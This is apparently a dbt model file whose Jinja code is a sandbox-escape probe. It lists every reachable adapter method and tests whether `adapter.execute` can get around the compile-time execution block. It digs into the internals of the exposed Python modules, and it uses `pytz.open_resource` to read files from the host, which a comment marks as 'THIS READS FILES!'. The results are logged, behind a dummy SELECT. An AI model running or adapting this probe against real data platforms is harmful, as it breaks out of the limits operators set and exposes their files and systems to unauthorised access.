{# Deep module introspection + adapter method enumeration #}

{# 1. Enumerate ALL adapter methods/attributes accessible #}
{%- set adapter_methods = [] -%}
{%- for name in ['type', 'dispatch', 'create_schema', 'drop_schema', 'drop_relation',
                  'rename_relation', 'truncate_relation', 'get_columns_in_relation',
                  'get_missing_columns', 'expand_target_column_types',
                  'already_exists', 'get_relation', 'get_columns_in_query',
                  'execute', 'call', 'convert_type', 'convert_text_type',
                  'convert_boolean_type', 'convert_number_type', 'convert_date_type',
                  'convert_time_type', 'convert_datetime_type',
                  'list_schemas', 'check_schema_exists', 'list_relations_without_caching',
                  'resolve_schema_with_credentials',
                  'quote', 'Relation', 'Column',
                  'get_catalog', 'get_catalog_by_relations',
                  'calculate_freshness', 'run_sql',
                  'make_relation', 'upload_seed'] -%}
  {%- if adapter[name] is defined -%}
    {%- do adapter_methods.append(name) -%}
  {%- endif -%}
{%- endfor -%}
{{ log("ADAPTER_METHODS=" ~ adapter_methods | join(','), info=True) }}

{# 2. Try adapter.execute (if it exists, might bypass compile execute flag) #}
{%- if adapter.execute is defined -%}
  {{ log("ADAPTER_EXECUTE_TYPE=" ~ adapter.execute | string | truncate(200), info=True) }}
{%- endif -%}

{# 3. modules.re deep probe #}
{%- set re = modules.re -%}
{%- set re_attrs = [] -%}
{%- for name in ['compile', 'match', 'search', 'sub', 'findall', 'finditer',
                  'split', 'subn', 'escape', 'purge', 'template',
                  'Scanner', 'error', 'Pattern', 'Match',
                  '_compile', '_compile_repl', 'copyreg', 'enum', 'functools',
                  'sre_compile', 'sre_parse', '_constants', '_special_chars_map'] -%}
  {%- if re[name] is defined -%}
    {%- do re_attrs.append(name) -%}
  {%- endif -%}
{%- endfor -%}
{{ log("RE_ATTRS=" ~ re_attrs | join(','), info=True) }}

{# 4. Try re.compile then access pattern object internals #}
{%- set pat = re.compile('test') -%}
{{ log("PATTERN_TYPE=" ~ pat | string | truncate(200), info=True) }}
{%- set pat_attrs = [] -%}
{%- for name in ['match', 'search', 'findall', 'flags', 'groups', 'groupindex',
                  'pattern', 'scanner', 'sub', 'subn', 'split'] -%}
  {%- if pat[name] is defined -%}
    {%- do pat_attrs.append(name) -%}
  {%- endif -%}
{%- endfor -%}
{{ log("PATTERN_ATTRS=" ~ pat_attrs | join(','), info=True) }}

{# 5. modules.datetime deep probe #}
{%- set dt = modules.datetime -%}
{%- set dt_attrs = [] -%}
{%- for name in ['datetime', 'date', 'time', 'timedelta', 'timezone',
                  'MINYEAR', 'MAXYEAR', 'sys'] -%}
  {%- if dt[name] is defined -%}
    {%- do dt_attrs.append(name) -%}
  {%- endif -%}
{%- endfor -%}
{{ log("DT_ATTRS=" ~ dt_attrs | join(','), info=True) }}

{# 6. modules.itertools deep probe #}
{%- set it = modules.itertools -%}
{%- set it_attrs = [] -%}
{%- for name in ['chain', 'combinations', 'count', 'cycle', 'groupby',
                  'islice', 'permutations', 'product', 'repeat',
                  'starmap', 'takewhile', 'dropwhile', 'accumulate',
                  'compress', 'filterfalse', 'zip_longest', 'tee'] -%}
  {%- if it[name] is defined -%}
    {%- do it_attrs.append(name) -%}
  {%- endif -%}
{%- endfor -%}
{{ log("IT_ATTRS=" ~ it_attrs | join(','), info=True) }}

{# 7. modules.pytz deep probe - pytz has _tzinfo_cache and other internals #}
{%- set pz = modules.pytz -%}
{%- set pz_attrs = [] -%}
{%- for name in ['timezone', 'utc', 'all_timezones', 'common_timezones',
                  '_tzinfo_cache', '_FixedOffset', 'FixedOffset',
                  'BaseTzInfo', 'LazyList', 'LazySet',
                  'open_resource', 'resource_exists'] -%}
  {%- if pz[name] is defined -%}
    {%- do pz_attrs.append(name) -%}
  {%- endif -%}
{%- endfor -%}
{{ log("PZ_ATTRS=" ~ pz_attrs | join(','), info=True) }}

{# 8. pytz.open_resource - THIS READS FILES! #}
{%- if pz.open_resource is defined -%}
  {{ log("PYTZ_OPEN_RESOURCE_TYPE=" ~ pz.open_resource | string | truncate(200), info=True) }}
  {# Try to read a timezone file to confirm it works #}
  {%- set tzfile = pz.open_resource('zone.tab') -%}
  {{ log("PYTZ_ZONE_TAB=" ~ tzfile.read() | string | truncate(300), info=True) }}
  {%- do tzfile.close() -%}
  {{ log("PYTZ_OPEN_RESOURCE_WORKS=YES", info=True) }}
{%- endif -%}

{# 9. Try exceptions object for internal access #}
{%- if exceptions is defined -%}
  {{ log("EXCEPTIONS_KEYS=" ~ exceptions.keys() | list | join(',') | truncate(300), info=True) if exceptions.keys is defined else '' }}
{%- endif -%}

SELECT 1 as id
